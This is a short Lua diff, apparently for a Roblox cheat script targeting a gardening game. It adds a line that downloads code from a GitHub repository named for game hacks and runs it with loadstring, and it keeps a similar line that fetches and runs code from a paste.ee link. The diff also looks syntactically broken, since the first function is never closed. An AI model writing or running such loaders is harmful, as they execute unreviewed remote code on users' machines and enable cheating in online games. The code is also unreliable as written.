@@ -1,7 +1,7 @@
 local function r()
-    
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Turkeyeses/GROW-AND-GARDEN-HACKS/refs/heads/main/Sumasalako"))()
 local function farm()
-         loadstring(game:HttpGet("https://paste.ee/r/Qh33L5SF"))()
+    loadstring(game:HttpGet("https://paste.ee/r/Qh33L5SF"))()
 end
 
 task.spawn(r)
